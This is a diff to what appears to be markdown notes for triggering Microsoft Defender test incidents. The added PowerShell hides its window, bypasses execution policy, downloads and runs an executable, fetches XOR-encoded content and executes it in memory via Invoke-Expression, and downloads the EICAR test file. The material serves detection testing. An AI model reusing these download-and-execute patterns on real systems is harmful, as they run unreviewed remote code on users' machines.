@@ -101,3 +101,43 @@ Incidents <br>
 ```cmd
 powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference = 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
 ```
+
+## 3. Suspicious powershell script
+```powershell
+# Set the security protocol to TLS 1.2
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+
+# Define the XOR key as a byte array encoded in UTF-8
+$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection')
+
+# Fetch the base64 encoded string from the specified URL
+$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/MTP_Fileless_Recon.txt -UseBasicParsing).Content
+
+# Try to convert the base64 string to byte array, handle potential errors
+Try {
+    $contentBytes = [System.Convert]::FromBase64String($base64String)
+} Catch {
+    # If there's an error, attempt to convert the base64 string after removing the first 3 characters
+    $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3))
+}
+
+# Initialize a counter and an array to store the decrypted bytes
+$i = 0
+$decryptedBytes = @()
+
+# Decrypt the content using XOR operation
+$contentBytes.ForEach {
+    $decryptedBytes += $_ -bxor $xor[$i]
+    $i++
+    if ($i -eq $xor.Length) {
+        $i = 0
+    }
+}
+
+# Execute the decrypted content as a PowerShell expression
+Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))
+```
+
+```powershell
+Invoke-WebRequest  "https://www.eicar.org/download/eicar_com-zip/?wpdmdl=8847&refresh=65d4b58cc7e0e1708438924" -OutFile C:\project\ps.zip
+```
